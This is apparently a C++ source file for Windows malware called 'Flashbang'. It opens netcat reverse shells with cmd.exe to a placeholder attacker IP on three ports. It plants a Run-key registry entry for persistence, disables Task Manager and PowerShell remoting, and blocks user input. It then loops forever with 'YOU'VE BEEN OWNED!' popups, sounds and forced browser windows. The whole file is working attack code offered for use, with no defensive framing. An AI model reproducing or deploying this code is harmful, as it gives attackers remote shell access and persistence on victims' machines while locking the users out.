#include <iostream>
using namespace std;
#include <windows.h>
#include <winable.h>
#include <winuser.h>
#include <mmsystem.h>
#include <string.h>
#include <strings.h>

//to-do add a curler to download nc.exe to working directory

//Punch holes out with reverse shells to attacker
void holepunch(){
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port1 = "nc.exe [ATTACKER IP] 5555 -e cmd.exe";
    const char *command1 = port1.c_str(); 
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port2 = "nc.exe [ATTACKER IP] 7777 -e cmd.exe";
    const char *command2 = port2.c_str(); 
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port3 = "nc.exe [ATTACKER IP] 9999 -e cmd.exe";
    const char *command3 = port3.c_str(); 
    system(command1);
    system(command2);
    system(command3);
}

//Establish persistent annoyance with an autoruns registry key
void persistance(){
    char buf[MAX_PATH];
    GetModuleFileName(NULL, buf, MAX_PATH);
    HKEY persistKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &persistKey);
    if( ERROR_SUCCESS == lnRes ){
        lnRes = RegSetValueEx(persistKey, "Flashbang", 0, REG_SZ, (BYTE*)buf, strlen(buf));
    }
}

//Disable user input until broken via CTR+ALT+DEL
void BlockUserInput(){
    BlockInput(true);
}

//Disable Task Manager if they use CTR+ALT+DEL to escape
void DisableTaskManager(){
    string str = "Reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f";
    const char *command = str.c_str(); 
    system(command);
}

//Disable Remote PowerShell Access to the box
void disableRemotePowerShell(){
    string str = "powershell.exe Disable-PSRemoting -Force";
    const char *command = str.c_str();
    system(command);
}

//Spam their desktop with browsers connecting to sites of your choice
void browserTextSpam(){
    string str = "start iexplore.exe http://[ANY WEBSITE]";
    string str2 = "start iexplore.exe http://[ANY WEBSITE]";
    string str3 = "start iexplore.exe http://[ANY WEBSITE]";
    string str4 = "start iexplore.exe http://[ANY WEBSITE]";
    string str5 = "start iexplore.exe http://[ANY WEBSITE]";
    const char* A = str.c_str();
    const char* B = str2.c_str();
    const char* C = str3.c_str();
    const char* D = str4.c_str();
    const char* E = str5.c_str();
    system(A);
    system(B);
    system(C);
    system(D);
    system(E);
}

int main(){
    persistance();
    FreeConsole();  //Hide the console
    DisableTaskManager();
    disableRemotePowerShell();

    //Loop full of obstructions
    while(true){
        BlockUserInput();
        MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
        STARTUPINFOA si = {sizeof(STARTUPINFO)};
        PROCESS_INFORMATION pi;
        string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
        CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
                    NULL, //use this field to playSound -- i couldn't figure out the types here
                    NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
        browserTextSpam();
    }

    return 0;
}
